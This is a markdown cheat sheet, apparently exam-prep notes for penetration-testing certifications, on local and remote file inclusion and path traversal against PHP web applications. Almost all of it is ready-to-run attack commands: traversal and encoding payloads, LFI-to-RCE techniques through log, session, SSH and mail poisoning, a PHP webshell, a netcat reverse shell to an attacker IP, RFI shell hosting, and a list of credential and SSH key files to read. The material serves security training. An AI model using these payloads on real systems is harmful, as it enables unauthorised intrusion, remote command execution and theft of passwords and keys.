# LFI / RFI / Path Traversal Complete

> Local File Inclusion, Remote File Inclusion, and Path Traversal complete reference for CPTS/OSCP exams.

---

## 1. Path Traversal Detection

### Basic Detection

```bash
# Directory traversal sequences to test
../
..\
../../
..%2f
..%5c
%2e%2e%2f
%252e%252e%252f
....//
....\\

# Test URLs
curl -s "http://target.com/page.php?file=../../etc/passwd"
curl -s "http://target.com/page.php?file=../../../../etc/passwd"
curl -s "http://target.com/page.php?file=..\\..\\..\\Windows\\win.ini"
curl -s "http://target.com/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

### Common Parameters to Test

```txt
?file=
?page=
?include=
?path=
?doc=
?doc=
?document=
?root=
?load=
?read=
?template=
?location=
?dir=
?show=
?view=
?content=
?pdf=
?cat=
```

### URL Encoding for Filter Bypass

```bash
# Double URL encoding
%252e%252e%252fetc%252fpasswd

# Path traversal with added ./ sequences
../../../etc/passwd
../../../../etc/passwd

# Null byte injection (old PHP <5.3.4)
../../etc/passwd%00
```

---

## 2. LFI to RCE Techniques

### Technique 1: Log Poisoning (Most Reliable)

> **Concept:** Inject PHP code into server logs, then include the log file via LFI.

```bash
# Step 1: Send malicious User-Agent to any page
curl -s http://target.com/ -A "<?php system(\$_GET['c']); ?>"

# Step 2: Include the Apache access log
curl -s "http://target.com/page.php?file=/var/log/apache2/access.log&c=id"

# Step 3: Execute commands via the poisoned log
curl -s "http://target.com/page.php?file=/var/log/apache2/access.log&c=ls -la"

# Alternative log paths
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/vsftpd.log
/var/log/auth.log
/var/log/messages
```

**PHP Code for Log Poisoning:** The payload `<?php system($_GET['c']); ?>` is injected into a header (User-Agent, Referer, etc.), written to server logs, then executed by including the log file.

### Technique 2: PHP Wrappers

```bash
# Read source code (base64-encoded output)
curl -s "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"
curl -s "http://target.com/page.php?file=php://filter/read=convert.base64-encode/resource=config.php"

# Decode the output
curl -s "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# Read multiple files
curl -s "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=../../etc/passwd"

# Chain filters (zlib + base64)
curl -s "http://target.com/page.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php"
```

**php://filter Reference:**

| Filter | Purpose |
|--------|---------|
| `convert.base64-encode` | Read file contents (base64) |
| `convert.base64-decode` | Write base64 decoded content |
| `string.rot13` | ROT13 encode |
| `zlib.deflate` | Compress |
| `zlib.inflate` | Decompress |

### Technique 3: php://input (RCE)

> **Requires:** `allow_url_include=On`

```bash
# Execute code via POST body
curl -s -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('id');?>"

# Reverse shell
curl -s -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f');?>"
```

### Technique 4: data:// Wrapper

> **Requires:** `allow_url_include=On`

```bash
# Execute code via data URL
curl -s "http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# Decoded: <?php system($_GET['c']); ?>

# Alternative
curl -s "http://target.com/page.php?file=data:text/plain,<?php%20system('id');?>"
```

### Technique 5: expect:// Wrapper

> **Requires:** PHP expect module installed (rare)

```bash
# Direct command execution
curl -s "http://target.com/page.php?file=expect://id"
```

### Technique 6: /proc/self/environ

```bash
# Step 1: Inject PHP code into User-Agent
curl -s http://target.com/ -A "<?php system(\$_GET['c']); ?>"

# Step 2: Include /proc/self/environ
curl -s "http://target.com/page.php?file=/proc/self/environ&c=id"
```

### Technique 7: PHP Session Poisoning

```bash
# Step 1: Find session file name from cookie
PHPSESSID=abc123 -> Session file: /var/lib/php/sessions/sess_abc123

# Step 2: Inject PHP code into session via crafted request
curl -s "http://target.com/login.php" -b "PHPSESSID=abc123" \
  -d "username=<?php system(\$_GET['c']); ?>&password=test"

# Step 3: Include session file
curl -s "http://target.com/page.php?file=/var/lib/php/sessions/sess_abc123&c=id"

# Common session paths
/var/lib/php/sessions/sess_[SESSIONID]
/var/lib/php/session/sess_[SESSIONID]
/var/lib/php/sess_[SESSIONID]
/tmp/sess_[SESSIONID]
```

### Technique 8: SSH Log Poisoning

```bash
# Step 1: SSH with malicious username
ssh "<?php system(\$_GET['c']); ?>@target.com"

# Step 2: Include auth log
curl -s "http://target.com/page.php?file=/var/log/auth.log&c=id"
```

### Technique 9: Mail Log Poisoning

```bash
# Step 1: Send email via SMTP with PHP code in From field
telnet target.com 25
HELO attacker
MAIL FROM: <?php system($_GET['c']); ?>
RCPT TO: victim@target.com
DATA
test
.

# Step 2: Include mail log
curl -s "http://target.com/page.php?file=/var/log/mail.log&c=id"
```

---

## 3. LFI File Read Targets

```bash
# Linux - Critical files to read
/etc/passwd
/etc/shadow
/etc/hosts
/etc/apache2/apache2.conf
/etc/apache2/ports.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/proc/self/cmdline
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2

# Web application config
/var/www/html/config.php
/var/www/html/.htaccess
/var/www/html/wp-config.php
/var/www/html/configuration.php

# SSH keys
/root/.ssh/id_rsa
/home/[user]/.ssh/id_rsa

# History files
/root/.bash_history
/home/[user]/.bash_history

# Windows target files
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\inetpub\wwwroot\web.config
```

---

## 4. RFI (Remote File Inclusion)

### Detection

```bash
# Test if allow_url_include is enabled
curl -s "http://target.com/page.php?file=http://google.com"
curl -s "http://target.com/page.php?file=http://YOUR_IP/test.txt"

# If you see Google's page content or your file content -> RFI works
```

### Exploitation

```bash
# Host a PHP shell on your attacker machine
echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.txt
python3 -m http.server 80

# Remote include
curl -s "http://target.com/page.php?file=http://YOUR_IP/shell.txt&c=id"

# With URL encoding
curl -s "http://target.com/page.php?file=http://YOUR_IP/shell.txt%00&c=id"
```

### RFI Shell Hosting

```bash
# Host a proper PHP shell
cat > /var/www/html/rfi.txt << 'EOF'
<?php system($_GET['c']); ?>
EOF

# Python server for hosting
python3 -m http.server 80

# SMB share (Windows targets)
impacket-smbserver share /var/www/html/ -smb2support
# Include: \\YOUR_IP\share\shell.txt
```

---

## 5. LFI Wordlists (ffuf)

```bash
# Linux LFI paths
ffuf -u "http://target.com/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 0,404

# Windows LFI paths
ffuf -u "http://target.com/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-WinPaths.txt -fc 0,404

# LFI traversal depth variants
ffuf -u "http://target.com/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Custom traversal wordlist
# Generate with varying depth
for i in 1 2 3 4 5 6 7 8; do
    dots=$(printf '../%.0s' $(seq 1 $i))
    echo "${dots}etc/passwd"
    echo "${dots}etc/hosts"
    echo "${dots}proc/self/environ"
done > traversal.txt

ffuf -u "http://target.com/page.php?file=FUZZ" -w traversal.txt -fs 0
```

### PHP Wrapper Wordlist

```bash
# Create a wordlist of PHP wrappers to try
echo "php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id" > php_wrappers.txt

ffuf -u "http://target.com/page.php?file=FUZZ" -w php_wrappers.txt -fc 0,404
```

---

## LFI to RCE Decision Tree

```
Found LFI!
    |
    v
Can you read PHP files with php://filter?
    | YES -> Read source code, find creds, find another RCE
    | NO  -> v
             |
Can you include php://input or data://?
    | YES -> Immediate RCE!
    | NO  -> v
             |
Can you write to log files? (check permissions)
    | YES -> Log Poisoning (User-Agent, Referer)
    | NO  -> v
             |
Can you poison PHP sessions?
    | YES -> Session Poisoning
    | NO  -> v
             |
/proc/self/environ accessible?
    | YES -> Environ Poisoning
    | NO  -> v
             |
Check for SSH/mail log poisoning
    | YES -> SSH/Mail Log Poisoning
    | NO  -> Try RFI or look for file upload functionality
```

---

## Related Topics

- [[../../3.1 Recon and Discovery/ffuf Mastery]] - Wordlist fuzzing for LFI
- [[../../3.1 Recon and Discovery/Web Recon Methodology]] - Discovery of LFI params
- [[../3.2 SQL Injection/SQL Injection Complete]] - SQLi with INTO OUTFILE for LFI use
- [[../3.7 File Upload Attacks/File Upload Attacks Complete]] - Upload + LFI = RCE
